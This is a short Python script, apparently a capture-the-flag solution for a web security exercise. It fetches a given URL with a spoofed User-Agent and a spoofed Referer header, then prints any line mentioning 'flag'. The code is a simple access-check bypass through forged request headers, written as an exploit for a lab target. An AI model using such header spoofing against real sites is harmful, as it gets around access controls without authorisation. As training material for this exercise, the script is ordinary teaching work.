import requests
import sys

def header_exploit(url):
        payload = {
                "User-Agent": "ft_bornToSec",
                "Referer": "https://www.nsa.gov/"
                }
        req = requests.get(url, headers=payload)

        if req.status_code != 200:
                sys.exit("Request failed, check the URL")

        for line in req.text.splitlines():
                if "flag" in line:
                        print(line)


if __name__ == "__main__":
        if len(sys.argv) != 2:
                sys.exit("Usage: python3 param_exploit.py  <URL>")
        else:
                url = sys.argv[1]
                header_exploit(url)

